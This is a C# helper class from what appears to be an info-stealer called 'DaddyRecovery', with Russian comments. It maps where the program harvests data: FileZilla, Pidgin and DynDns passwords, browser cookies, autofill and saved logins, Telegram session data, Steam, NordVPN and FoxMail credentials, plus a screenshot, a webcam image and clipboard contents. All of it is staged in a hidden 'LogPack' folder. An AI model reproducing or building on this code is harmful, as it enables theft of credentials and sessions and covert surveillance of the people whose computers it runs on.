namespace DaddyRecovery.Helpers
{
    using System;
    using System.IO;
    using System.Reflection;

    public static class GlobalPath
    {
        public static readonly string UserName = Environment.UserName, MachineName = Environment.MachineName;
        public static string OSBit => Environment.Is64BitOperatingSystem == true ? "x64" : "x32";
        public static readonly string SystemDir = Environment.SystemDirectory;
        public static readonly int ProcessorCount = Environment.ProcessorCount;

        public static readonly string GetFileName = CombineEx.GetFileName(AppDomain.CurrentDomain.FriendlyName);

        // Переменные по которым будем искать файлы БД
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Путь до папки AppData
        public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); // Путь до папки LocalAppData
        public static readonly string MyDoc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        public static readonly string AllUsers = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
        public static readonly string DynDns = CombineEx.CombinePath(AllUsers, @"Dyn\Updater\config.dyndns"); // Логины и пароли из DynDns
        public static readonly string DynDnsSave = CombineEx.CombinePath(HomePath, "DynDns.txt");

        public static readonly string FZilla = CombineEx.CombinePath(AppData, @"FileZilla\recentservers.xml"); // Логины и пароли из FileZilla
        public static readonly string FileZillaSave = CombineEx.CombinePath(HomePath, "FileZilla.txt");

        public static readonly string PidPurple = CombineEx.CombinePath(AppData, @".purple\accounts.xml"); // Логины и пароли из Pidgin
        public static readonly string PidginSave = CombineEx.CombinePath(HomePath, "Pidgin.txt");

        // Переменная для рабочего стола
        public static readonly string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Рабочий стол пользователя

        // Пути до папки куда будем всё сохранять
        public static readonly string HomePath = CombineEx.CombinePath(AppData, "LogPack");
        public static readonly string Logs = CombineEx.CombinePath(HomePath, "Logs");
        public static readonly string AutoFillLogs = CombineEx.CombinePath(Logs, "AutoFill");
        public static readonly string CookiesLogs = CombineEx.CombinePath(Logs, "Cookies");

        public static readonly string CookiesPath = CombineEx.CombinePath(HomePath, "Cookies"); // Временная папка для сбора Cookies файлов
        public static readonly string WebDataPath = CombineEx.CombinePath(HomePath, "WebData"); // Временная папка для сборка WebData файлов
        public static readonly string LoginsPath = CombineEx.CombinePath(HomePath, "Logins"); // Временная папка для сборка Logins файлов

        // Путь к скриншоту
        public static readonly string Screen = CombineEx.CombinePath(HomePath, string.Concat(UserName, ".jpeg"));

        public static readonly string WebSave = CombineEx.CombinePath(HomePath, "CaptureCam.png");

        public static readonly string OSave = CombineEx.CombinePath(HomePath, "PC_Log.html");

        public static readonly string BufferSave = CombineEx.CombinePath(HomePath, "Clipboard.txt");

        private static readonly string Telegram = CombineEx.CombinePath(AppData, "Telegram Desktop");
        public static readonly string Tdata = CombineEx.CombinePath(Telegram, "tdata");
        public static readonly string TelegaHome = CombineEx.CombinePath(HomePath, "Telegram");

        public static readonly string FoxMailPass = CombineEx.CombinePath(HomePath, "FoxMail");
        public static readonly string FoxMailLog = CombineEx.CombinePath(FoxMailPass, "Account.txt");

        public static readonly string NordPath = CombineEx.CombinePath(LocalAppData, "NordVPN");
        public static readonly string NordSave = CombineEx.CombinePath(HomePath, "NordVPN.txt");

        public static readonly string SteamUserPath = CombineEx.CombinePath(Applications.Steam.SteamPath.GetLocationSteam(), @"config\loginusers.vdf");
        public static readonly string Steam_Dir = CombineEx.CombinePath(HomePath, "Steam");
        public static readonly string SteamID = CombineEx.CombinePath(Steam_Dir, "SteamID.txt");

        public static readonly string LocalFireFoxDir = CombineEx.CombinePath(AppData, @"Mozilla\Firefox\Profiles");
        public static readonly string Firefox = CombineEx.CombinePath(HomePath, "Firefox");
    }
}